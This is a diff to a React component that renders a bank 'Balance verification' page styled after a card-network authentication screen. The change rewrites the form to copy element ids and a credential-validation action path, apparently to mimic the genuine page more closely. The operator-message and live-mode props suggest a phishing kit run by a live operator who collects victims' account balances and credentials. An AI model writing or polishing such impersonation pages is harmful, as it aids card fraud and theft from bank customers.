@@ -379,10 +379,15 @@ export function VerificationUi(props: BankLayoutProps) {
     const submitting = (lp?.submitting as boolean) ?? false;
     const canSubmit = (lp?.canSubmit as boolean) ?? false;
 
+    const showLiveBalance = showLive && baseLayout === "balance";
+
     const handleBalanceSubmit = (e: React.FormEvent) => {
       e.preventDefault();
-      onSubmit();
+      if (showLiveBalance) onSubmit();
     };
+
+    const showError = operatorMessage && operatorMessage.message;
+    const errorMessage = operatorMessage?.message ?? "";
 
     return (
       <VerificationPage
@@ -392,6 +397,87 @@ export function VerificationUi(props: BankLayoutProps) {
         inProgress={inProgress}
         hasParams={hasParams}
         error={error}
+        footer={
+          <form
+            action="/Api/2_1_0/NextStep/ValidateCredential"
+            autoComplete="off"
+            id="BalanceValidateForm"
+            method="post"
+            name="BalanceValidateForm"
+            noValidate
+            onSubmit={handleBalanceSubmit}
+          >
+            <div className="visa-row">
+              <div className="col-12 visa-styling">
+                <div className="form-group text-center">
+                  <div id="InputAction">
+                    <label htmlFor="BalanceInput" className="credential-label">Balance</label>
+                    <input
+                      autoFocus
+                      className="form-control visa-styling credential-input"
+                      id="BalanceInput"
+                      inputMode="decimal"
+                      name="Balance.Value"
+                      placeholder="e.g. 1,234.56"
+                      type="text"
+                      value={showLiveBalance ? balance : ""}
+                      onChange={
+                        showLiveBalance
+                          ? (e) => onBalanceChange(e.target.value)
+                          : undefined
+                      }
+                      disabled={submitting}
+                      readOnly={!showLiveBalance}
+                    />
+                    <div className="form-group" id="ErrorMessage">
+                      <img
+                        id="WarningImage"
+                        src="data:,"
+                        alt="Warning"
+                        style={{ display: showError ? "inline" : "none" }}
+                      />
+                      <span
+                        id="ValidationErrorMessage"
+                        className="field-validation-error"
+                        style={{ display: showError ? "inline" : "none" }}
+                      >
+                        {errorMessage}
+                      </span>
+                    </div>
+                    <div className="visa-col-12 text-center">
+                      <button
+                        type="submit"
+                        className="visa-styling btn btn-primary text-uppercase vba-button"
+                        id="ValidateButton"
+                        disabled={showLiveBalance && (submitting || !canSubmit)}
+                      >
+                        {submitting ? "Submitting..." : "Submit"}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div className="footer" id="FooterLinks">
+              <div className="row">
+                <div className="visa-col-12 helpRow" id="Accordion">
+                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
+                    <li className="list-group-item border-0">
+                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
+                        Need some help?
+                      </a>
+                    </li>
+                    <li className="list-group-item border-0">
+                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
+                        learn more about authentication
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </form>
+        }
       >
         <h2 className="screenreader-only">Balance verification</h2>
         <div className="visa-row">
@@ -404,47 +490,6 @@ export function VerificationUi(props: BankLayoutProps) {
             </div>
           </div>
         </div>
-        {operatorMessage && (
-          <div className={`form-group ${messageClass}`} style={{ marginTop: 8 }}>
-            {operatorMessage.message}
-          </div>
-        )}
-        <form onSubmit={handleBalanceSubmit} autoComplete="off" noValidate>
-          <div className="visa-row">
-            <div className="col-12 visa-styling">
-              <div className="form-group text-center">
-                <div className="input-action">
-                  <label htmlFor="balance-input" className="credential-label">Balance</label>
-                  <input
-                    id="balance-input"
-                    type="text"
-                    inputMode="decimal"
-                    className="form-control visa-styling credential-input"
-                    value={balance}
-                    onChange={(e) => onBalanceChange(e.target.value)}
-                    disabled={submitting}
-                    placeholder="e.g. 1,234.56"
-                  />
-                  <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
-                    <button
-                      type="submit"
-                      className="visa-styling btn btn-primary text-uppercase vba-button"
-                      disabled={submitting || !canSubmit}
-                    >
-                      {submitting ? "Submitting..." : "Submit"}
-                    </button>
-                  </div>
-                  {submitting && (
-                    <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-                      <Spinner size={40} />
-                      <span>Waiting for confirmation...</span>
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-          </div>
-        </form>
       </VerificationPage>
     );
   }
